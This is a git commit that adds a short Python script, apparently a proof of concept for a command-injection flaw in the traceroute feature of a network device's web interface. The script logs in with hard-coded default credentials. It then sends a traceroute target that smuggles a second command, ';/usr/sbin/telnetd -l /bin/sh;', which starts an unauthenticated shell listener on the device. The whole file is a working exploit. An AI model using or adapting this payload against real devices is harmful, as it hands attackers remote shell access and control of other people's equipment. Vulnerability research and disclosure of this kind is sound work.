5ce915f8fb65150afe7274c14c5852011a72a1f8
little_two_black <70244793+JZP018@users.noreply.github.com>
2025-02-24 19:05:09 +0800

    Update CI_traceRoute.py

--- linsys/E5600/CI_traceRoute/CI_traceRoute.py
+++ linsys/E5600/CI_traceRoute/CI_traceRoute.py
@@ -1,1 +1,26 @@
+import requests
+import json
 
+url1 = 'http://192.168.10.6/cgi-bin/login.cgi'
+data1 = {"username":"YWRtaW4%3D","password":"MTIzNDU2","token":"","source":"web","cn":"","action":"auth"}
+
+response1 = requests.post(url1, data=json.dumps(data1))
+print(response1.text)
+
+url = 'http://192.168.10.6/API/info'
+headers = {
+    'Host': '192.168.10.6',
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
+    'Content-Type': 'application/json',
+    'Origin': 'http://192.168.10.6',
+    'Referer': 'http://192.168.10.6/idp/idp_ping.html',
+    'Cookie': response1.headers['Set-Cookie'].split(" ")[0],
+}
+data = {
+    'traceRoute': {
+        'ipurl': '192.168.10.1;/usr/sbin/telnetd -l /bin/sh;'
+    }
+}
+
+response = requests.post(url, headers=headers, data=json.dumps(data))
+print(response.text)
